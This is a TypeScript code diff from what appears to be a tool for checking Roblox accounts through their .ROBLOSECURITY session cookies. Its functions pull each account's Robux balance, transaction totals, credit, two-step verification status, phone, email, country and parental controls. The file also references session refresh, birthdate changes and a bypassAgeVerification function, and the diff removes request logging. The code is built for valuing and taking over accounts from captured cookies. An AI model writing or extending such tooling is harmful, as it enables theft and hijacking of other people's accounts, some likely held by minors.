@@ -7,22 +7,6 @@ const AXIOS_TIMEOUT = 30000;
 const MAX_RETRIES = 3;
 const RETRY_DELAY = 1000;
 
-axios.interceptors.request.use(config => {
-  logger.debug({ url: config.url, method: config.method }, 'Outgoing request');
-  return config;
-});
-
-axios.interceptors.response.use(
-  response => {
-    logger.debug({ status: response.status, url: response.config.url }, 'Response received');
-    return response;
-  },
-  error => {
-    logger.error({ err: error, url: error.config?.url }, 'Request failed');
-    return Promise.reject(error);
-  }
-);
-
 async function axiosWithRetry<T>(
   method: 'get' | 'post' | 'patch',
   url: string,
@@ -42,7 +26,6 @@ async function axiosWithRetry<T>(
       lastError = err;
       if (attempt < retries) {
         const delay = RETRY_DELAY * Math.pow(2, attempt) + Math.random() * 500;
-        logger.debug(`Retry ${attempt} for ${url} in ${delay}ms`);
         await new Promise(resolve => setTimeout(resolve, delay));
       }
     }
@@ -137,67 +120,100 @@ export async function validateCookie(cookie: string, maxAttempts = 4): Promise<{
   };
 }
 
-export async function fetchCreditBalance(cookie: string): Promise<{ balance: number; currency: string }> {
+export async function getUserAge(userId: number): Promise<number> {
   try {
-    const resp = await axios.get('https://billing.roblox.com/v1/credit', {
+    const resp = await axios.get(`https://users.roblox.com/v1/users/${userId}`, { timeout: AXIOS_TIMEOUT });
+    const created = new Date(resp.data.created);
+    const now = new Date();
+    const diff = now.getTime() - created.getTime();
+    return Math.floor(diff / (1000 * 3600 * 24));
+  } catch {
+    return -1;
+  }
+}
+
+export async function fetchRobux(cookie: string, userId: string): Promise<number> {
+  try {
+    const resp = await axiosWithRetry<any>('get', `https://economy.roblox.com/v1/users/${userId}/currency`, {
       headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
-      validateStatus: () => true,
-      timeout: 10000,
+    });
+    if (resp.status === 200 && resp.data?.robux !== undefined) return resp.data.robux;
+  } catch {}
+  return 0;
+}
+
+export async function fetchTransactionTotals(cookie: string, userId: string): Promise<{ incoming: number; outgoing: number }> {
+  try {
+    const resp = await fetch(`https://apis.roblox.com/transaction-records/v1/users/${userId}/transaction-totals?usedTypes=2228224&timeFrame=Year&transactionType=summary`, {
+      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
     });
     if (resp.status === 200) {
-      return { balance: resp.data.balance || 0, currency: resp.data.currencyCode || 'USD' };
+      const data = (await resp.json()) as { incomingRobuxTotal: number; outgoingRobuxTotal: number };
+      return { incoming: data.incomingRobuxTotal || 0, outgoing: data.outgoingRobuxTotal || 0 };
     }
-  } catch (err) { logger.error({ err }, 'fetchCreditBalance'); }
-  return { balance: 0, currency: 'USD' };
+  } catch {}
+  return { incoming: 0, outgoing: 0 };
 }
 
-export async function fetchTwoStepConfig(cookie: string, userId: string): Promise<{ email: boolean; authenticator: boolean }> {
-  try {
-    const resp = await axios.get(`https://twostepverification.roblox.com/v1/users/${userId}/configuration`, {
-      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
-      validateStatus: () => true,
-      timeout: 10000,
-    });
-    if (resp.status === 200 && resp.data.methods) {
-      const methods = resp.data.methods || [];
-      const email = methods.some(m => m.mediaType === 'Email' && m.enabled);
-      const authenticator = methods.some(m => m.mediaType === 'Authenticator' && m.enabled);
-      return { email, authenticator };
-    }
-  } catch (err) { logger.error({ err }, 'fetchTwoStepConfig'); }
-  return { email: false, authenticator: false };
+export async function fetchCountry(cookie: string, retries = 2): Promise<string> {
+  for (let i = 0; i <= retries; i++) {
+    try {
+      const resp = await fetch('https://accountsettings.roblox.com/v1/account/settings/account-country', {
+        headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
+      });
+      if (resp.status === 200) {
+        const data = (await resp.json()) as { value: { countryName: string } };
+        return data.value?.countryName || 'Unknown';
+      }
+    } catch {}
+    if (i < retries) await new Promise(resolve => setTimeout(resolve, 500 * (i + 1)));
+  }
+  return 'Unknown';
 }
 
-export async function fetchPhoneInfo(cookie: string): Promise<{ hasPhone: boolean; verified: boolean }> {
+export async function fetchEmailInfo(cookie: string, retries = 2): Promise<{ verified: string | null; pending: string | null }> {
+  for (let i = 0; i <= retries; i++) {
+    try {
+      const resp = await fetch('https://accountsettings.roblox.com/v1/email', {
+        headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
+      });
+      if (resp.status === 200) {
+        const data = (await resp.json()) as { emailAddress: string; verified: boolean; canBypassPasswordForEmailUpdate: boolean };
+        return { verified: data.verified ? data.emailAddress : null, pending: null };
+      }
+    } catch {}
+    if (i < retries) await new Promise(resolve => setTimeout(resolve, 500 * (i + 1)));
+  }
+  return { verified: null, pending: null };
+}
+
+export async function fetchParentalControls(cookie: string): Promise<{ hasParent: boolean }> {
   try {
-    const resp = await axios.get('https://accountinformation.roblox.com/v1/phone', {
+    const resp = await fetch('https://apis.roblox.com/parental-controls-api/v1/parental-controls/get-linked-parents', {
       headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
-      validateStatus: () => true,
-      timeout: 10000,
     });
     if (resp.status === 200) {
-      const data = resp.data;
-      return { hasPhone: !!data.countryCode && !!data.phone, verified: data.isVerified || false };
+      const data = (await resp.json()) as { parents: unknown[]; canAddParent: boolean };
+      return { hasParent: (data.parents && data.parents.length > 0) || false };
     }
-  } catch (err) { logger.error({ err }, 'fetchPhoneInfo'); }
-  return { hasPhone: false, verified: false };
+  } catch {}
+  return { hasParent: false };
 }
 
-export async function fetchRolimonsRAP(userId: string): Promise<{ rap: number | null; premium: boolean }> {
+export async function fetchAvatarThumbnail(userId: string): Promise<string | null> {
   try {
-    const resp = await axios.get(`https://api.rolimons.com/players/v1/playerinfo/${userId}`, {
-      validateStatus: () => true,
-      timeout: 10000,
-    });
-    if (resp.status === 200 && resp.data.success) {
-      const data = resp.data;
-      return {
-        rap: data.rap !== undefined && data.rap !== null ? data.rap : null,
-        premium: data.premium || false,
-      };
+    const resp = await fetch(
+      `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=false`,
+      { headers: { 'User-Agent': 'Mozilla/5.0' } }
+    );
+    if (resp.status === 200) {
+      const data = (await resp.json()) as { data: { imageUrl: string }[] };
+      if (data.data && data.data.length > 0 && data.data[0].imageUrl) {
+        return data.data[0].imageUrl;
+      }
     }
-  } catch (err) { logger.error({ err }, 'fetchRolimonsRAP'); }
-  return { rap: null, premium: false };
+  } catch {}
+  return null;
 }
 
 export async function refreshSession(cookie: string): Promise<{ success: boolean; newCookie: string | null; error?: string }> {
@@ -357,6 +373,69 @@ export async function updateBirthdate(cookie: string, birthdate: string, passwor
   } catch (err: any) {
     return { success: false, status: 0, message: err.message };
   }
+}
+
+export async function fetchCreditBalance(cookie: string): Promise<{ balance: number; currency: string }> {
+  try {
+    const resp = await axios.get('https://billing.roblox.com/v1/credit', {
+      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
+      validateStatus: () => true,
+      timeout: 10000,
+    });
+    if (resp.status === 200) {
+      return { balance: resp.data.balance || 0, currency: resp.data.currencyCode || 'USD' };
+    }
+  } catch {}
+  return { balance: 0, currency: 'USD' };
+}
+
+export async function fetchTwoStepConfig(cookie: string, userId: string): Promise<{ email: boolean; authenticator: boolean }> {
+  try {
+    const resp = await axios.get(`https://twostepverification.roblox.com/v1/users/${userId}/configuration`, {
+      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
+      validateStatus: () => true,
+      timeout: 10000,
+    });
+    if (resp.status === 200 && resp.data.methods) {
+      const methods = resp.data.methods || [];
+      const email = methods.some(m => m.mediaType === 'Email' && m.enabled);
+      const authenticator = methods.some(m => m.mediaType === 'Authenticator' && m.enabled);
+      return { email, authenticator };
+    }
+  } catch {}
+  return { email: false, authenticator: false };
+}
+
+export async function fetchPhoneInfo(cookie: string): Promise<{ hasPhone: boolean; verified: boolean }> {
+  try {
+    const resp = await axios.get('https://accountinformation.roblox.com/v1/phone', {
+      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
+      validateStatus: () => true,
+      timeout: 10000,
+    });
+    if (resp.status === 200) {
+      const data = resp.data;
+      return { hasPhone: !!data.countryCode && !!data.phone, verified: data.isVerified || false };
+    }
+  } catch {}
+  return { hasPhone: false, verified: false };
+}
+
+export async function fetchRolimonsRAP(userId: string): Promise<{ rap: number | null; premium: boolean }> {
+  try {
+    const resp = await axios.get(`https://api.rolimons.com/players/v1/playerinfo/${userId}`, {
+      validateStatus: () => true,
+      timeout: 10000,
+    });
+    if (resp.status === 200 && resp.data.success) {
+      const data = resp.data;
+      return {
+        rap: data.rap !== undefined && data.rap !== null ? data.rap : null,
+        premium: data.premium || false,
+      };
+    }
+  } catch {}
+  return { rap: null, premium: false };
 }
 
 export async function bypassAgeVerification(cookie: string, password: string): Promise<{
